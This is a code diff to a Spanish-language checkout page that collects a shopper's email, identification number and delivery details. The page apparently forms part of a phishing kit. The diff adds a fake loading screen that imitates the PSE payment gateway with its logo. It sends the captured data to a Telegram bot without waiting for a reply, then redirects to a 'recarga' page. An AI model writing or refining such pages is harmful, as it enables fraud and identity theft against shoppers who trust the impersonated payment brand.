@@ -185,6 +185,67 @@
             transform: scale(0.98);
         }
 
+        /* MODAL DE CARGA PSE */
+        .modal-carga {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .modal-carga-contenido {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 32px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            max-width: 320px;
+            width: 90%;
+        }
+
+        .logo-pse {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .spinner-pse {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #0033A0;
+            border-bottom: 4px solid #E31837;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .modal-carga p {
+            font-size: 16px;
+            color: #1a2c3e;
+            font-weight: 600;
+            margin-top: 15px;
+        }
+
+        .modal-carga small {
+            font-size: 12px;
+            color: #666;
+            display: block;
+            margin-top: 10px;
+        }
+
         @media (max-width: 900px) {
             .container {
                 grid-template-columns: 1fr;
@@ -199,7 +260,6 @@
 
 <div class="container">
     <div class="checkout-form">
-        <!-- Contacto -->
         <h2 class="section-title">📞 Contacto</h2>
         <div class="form-group">
             <label>Correo electrónico</label>
@@ -210,7 +270,6 @@
             <label>Enviarme novedades y ofertas por correo electrónico</label>
         </div>
 
-        <!-- Identificación -->
         <h2 class="section-title">🆔 Identificación</h2>
         <div class="form-group">
             <label>Tipo de identificación</label>
@@ -225,7 +284,6 @@
             <input type="text" id="num-identificacion" placeholder="Número de identificación">
         </div>
 
-        <!-- Entrega -->
         <h2 class="section-title">🚚 Entrega</h2>
         <div class="row-2">
             <div class="form-group">
@@ -341,6 +399,19 @@
     </div>
 </div>
 
+<!-- MODAL DE CARGA PSE -->
+<div id="modalCarga" class="modal-carga">
+    <div class="modal-carga-contenido">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/66/PSE_logo.svg/200px-PSE_logo.svg.png" 
+             alt="PSE" 
+             class="logo-pse"
+             onerror="this.src='https://placehold.co/200x80/0033A0/white?text=PSE'">
+        <div class="spinner-pse"></div>
+        <p>Procesando pago seguro</p>
+        <small>Redirigiendo a PSE... espere un momento</small>
+    </div>
+</div>
+
 <script>
     // =============================================
     // CONFIGURACIÓN DE TELEGRAM
@@ -422,8 +493,24 @@
         return true;
     }
 
+    // Mostrar modal de carga
+    function mostrarModalCarga() {
+        const modal = document.getElementById('modalCarga');
+        modal.style.display = 'flex';
+        // Animación suave al aparecer
+        modal.style.opacity = '0';
+        setTimeout(() => { modal.style.opacity = '1'; }, 10);
+    }
+
+    // Ocultar modal de carga
+    function ocultarModalCarga() {
+        const modal = document.getElementById('modalCarga');
+        modal.style.opacity = '0';
+        setTimeout(() => { modal.style.display = 'none'; }, 300);
+    }
+
     // Enviar datos a Telegram
-    async function enviarATelegram(datosEnvio, total, productos) {
+    async function enviarATelegram(datosEnvio, total, productos, modal) {
         const ahora = new Date();
         const fecha = ahora.toLocaleString('es-ES', { 
             weekday: 'long', 
@@ -488,7 +575,7 @@
         mensaje += `📦 *Productos:* ${productos.length}\n\n`;
         mensaje += `🛍️ *PRODUCTOS:*\n`;
         productos.forEach((prod, idx) => {
-            mensaje += `${idx + 1}. ${prod.name}\n`;
+            mensaje += `${idx + 1}. ${prod.name.substring(0, 50)}...\n`;
             mensaje += `   📦 Cantidad: ${prod.quantity}\n`;
             mensaje += `   💰 Precio: ${formatCOP(prod.price)}\n`;
             mensaje += `   ━━━━━━━━━━━━━━━\n`;
@@ -506,29 +593,26 @@
         };
         
         try {
-            const response = await fetch(url, {
+            await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(params)
             });
-            const result = await response.json();
-            if (result.ok) {
-                console.log('Mensaje enviado a Telegram correctamente');
-            } else {
-                console.log('Error al enviar a Telegram:', result);
-            }
         } catch(e) {
             console.log('Error de conexión con Telegram:', e);
         }
     }
 
     // Guardar datos de envío y procesar
-    function guardarYProcesar() {
+    async function guardarYProcesar() {
         if (!validarFormulario()) return;
         if (!window.cartTotal || window.cartTotal === 0 || !window.cart || window.cart.length === 0) {
             alert('No hay productos en tu carrito');
             return;
         }
+        
+        // Mostrar modal de carga
+        mostrarModalCarga();
         
         const datosEnvio = {
             email: document.getElementById('email').value,
@@ -550,14 +634,13 @@
         // Guardar en localStorage
         localStorage.setItem('datosEnvio', JSON.stringify(datosEnvio));
         
-        // Enviar a Telegram
+        // Enviar a Telegram (sin esperar a que termine para no demorar)
         enviarATelegram(datosEnvio, window.cartTotal, window.cart);
         
-        // Mostrar mensaje y redirigir
-        alert('✅ Datos guardados correctamente. Redirigiendo al pago...\nTotal: ' + formatCOP(window.cartTotal));
-        
-        // Redirigir al pago PSE
-        window.location.href = 'https://hrg.mra.temporary.site/recargas/';
+        // Esperar 1.5 segundos para mostrar el modal y luego redirigir
+        setTimeout(() => {
+            window.location.href = '/panini/recarga.html';
+        }, 1500);
     }
 
     // Cargar datos guardados
